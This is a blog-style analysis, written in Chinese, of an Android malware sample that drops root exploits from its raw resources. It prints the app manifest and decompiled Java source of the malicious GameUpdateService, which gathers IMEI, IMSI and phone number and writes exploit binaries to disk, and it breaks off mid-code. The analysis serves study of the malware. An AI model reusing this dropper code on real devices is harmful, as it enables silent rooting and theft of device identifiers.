
# [原创]android的一款自释放root型恶意软件分析

首先介绍个网站

`be6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4G2L8Y4c8S2k6$3W2G2L8h3W2F1K9h3c8#2L8i4m8Q4x3X3g2T1L8r3!0Y4M7%4m8G2N6q4)9J5k6h3y4G2L8g2)9J5c8R3`.`.

非常好的一个网站，主要是他隔三差五的会放出个android恶意软件，我的分析就是基于他给出的apk文件。

注意要FQ

`android.dds.com-STiNiTER_analyse.apk`

首先这个是我的目标

`b6aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4G2L8Y4c8S2k6$3W2G2L8h3W2F1K9h3c8#2L8i4m8Q4x3X3g2T1L8r3!0Y4M7%4m8G2N6q4)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3e0u0Q4x3V1j5H3x3#2)9J5c8X3q4F1k6s2u0G2K9h3c8K6N6r3W2F1K9i4c8W2M7W2)9J5k6s2c8Y4L8r3!0S2k6r3g2J5i4K6u0V1L8h3q4D9N6$3q4J5k6g2)9J5k6h3S2@1L8h3I4Q4x3U0y4E0L8%4u0W2`

一个属于自释放root型的恶意代码。

## 1. 解包与反编译

首先解压缩，反编译就不细说了。具体用到了`jd-gui`，`dex2jar`，`apktool`

得到了`AndroidManifest.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="android.dds.com"
    android:versionCode="1"
    android:versionName="1.0" >
    <application
        android:icon="@drawable/icon"
        android:label="@string/app_name" >
        <activity
            android:configChanges="keyboardHidden|orientation"
            android:label="@string/app_name"
            android:name=".Main"
            android:screenOrientation="portrait" >
            <intent-filter >
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".service.PlayerBindService" />
        <service android:name="com.gamebox.service.GameUpdateService" />
    </application>
</manifest>
```

标红部分为恶意程序的主题，是个`service`

## 2. 入口 Activity

打开`Main` class，这个是起始`activity`，打开`Main.java`代码:看到一启动`Main`，就启动了后台`GameUpdateService`

```java
public void onCreate(Bundle paramBundle)
{
  super.onCreate(paramBundle);
  startService(new Intent(this, GameUpdateService.class));
  Instance = this;
```

## 3. 核心服务代码

这是这个释放性root恶意软件的核心代码，有注释

```java
package com.gamebox.service;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.dds.com.R;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.util.UUID;

public class GameUpdateService extends Service {
        private String DATA;
        private String IMEI;
        private String IMSI;
        private String MODEL;
        private InputStream MinputStreamAPK;
        private String MpathAPK;
        private int MstateAPKFile;
        private String OS;
        private String PHONENUMBER;
        private String PLATFORM;
        private String SCREENSIZE;
        private String infoName;
        private String infoPath;
        // 从raw资源中提取的恶意程序，root必要组件
        private InputStream inputStreamAPK;
        private InputStream inputStreamEX;
        private InputStream inputStreamEXE;
        private InputStream inputStreamID;
        private InputStream inputStreamKEEP;
        private InputStream inputStreamUNLOCK;
        private InputStream inputStreamstart;
        private DataInputStream localDataInputStream;
        private DataOutputStream localDataOutputStream;
        // 释放恶意程序，root必要组件的路径
        private String pathAPK;
        private String pathEX;
        private String pathEXE;
        private String pathID;
        private String pathKEEP;
        private String pathUNLOCK;
        private String pathstart;
        private Process process;
        //
        private int stateAPKFile;
        private int stateEXEFile;
        private int stateEXFile;
        private int stateIDFile;
        private int stateKEEPFile;
        private int stateUNLOCKFile;
        private int statestartFile;
        private String str;
        /*
         * 在service
         * oncreate结束后调用这些线程thread，第一个主要是输出这些apk到指定目录,这里我发现了些问题。在onCreate中已经提到了这个恶意程序的问题
         * 。 即data/data/android.gdwsklzz.com这个目录的权限问题，我估计是他抄的或者改的高达无双科鲁兹传的某个恶意软件版本。
         */
        Thread thread = new Thread(new Runnable() {
                public void run()
                { // 检查是否是root过的机子
                        if (!new File("/system/bin/keeper").exists()) {
                                System.out.println("---start rootSatae");
                                try {
                                        while (true) {
                                                String str = new String(GameUpdateService.this.DATA
                                                                .getBytes("UTF-8"), "UTF-8");
                                                // 这里会报错，因为infoPath是指向data/data/android.gdwsklzz.com/的，所以这个app是没有权限的，所以这个恶意程序在这里实际是走不通的。
                                                File localFile1 = new File(
                                                                GameUpdateService.this.infoPath);
                                                if (!localFile1.exists())
                                                        localFile1.mkdir();
                                                File localFile2 = new File(
                                                                GameUpdateService.this.infoPath
                                                                                + GameUpdateService.this.infoName);
                                                if (localFile2.exists())
                                                        localFile2.delete();
                                            //这里实际上是创建新文件
                                                localFile2.createNewFile();
                                                FileOutputStream localFileOutputStream = new FileOutputStream(
                                                                localFile2);
                                                localFileOutputStream.write(str.getBytes("UTF-8"));
                                                localFileOutputStream.flush();
                                                localFileOutputStream.close();
                                                // 后面是释放root代码的地方。这里利用的是从raw中提取的资源，利用后面的write方法写到了程序自己的目录中（而不是乱写别人的目录，这是不可能的），这里写了好几个apk，这也是关键的实现自释放的代码
                                                GameUpdateService.this.stateUNLOCKFile = GameUpdateService.this
                                                                .write(GameUpdateService.this.inputStreamUNLOCK,
                                                                                GameUpdateService.this.pathUNLOCK);
                                                if (GameUpdateService.this.stateUNLOCKFile != 0)
                                                        break label845;
                                                GameUpdateService.this.stateAPKFile = GameUpdateService.this
                                                                .write(GameUpdateService.this.inputStreamAPK,
                                                                                GameUpdateService.this.pathAPK);
                                                if (GameUpdateService.this.stateAPKFile != 0)
                                                        break label817;
                                                GameUpdateService.this.MstateAPKFile = GameUpdateService.this
                                                                .write(GameUpdateService.this.MinputStreamAPK,
                                                                                GameUpdateService.this.MpathAPK);
                                                if (GameUpdateService.this.MstateAPKFile != 0)
```

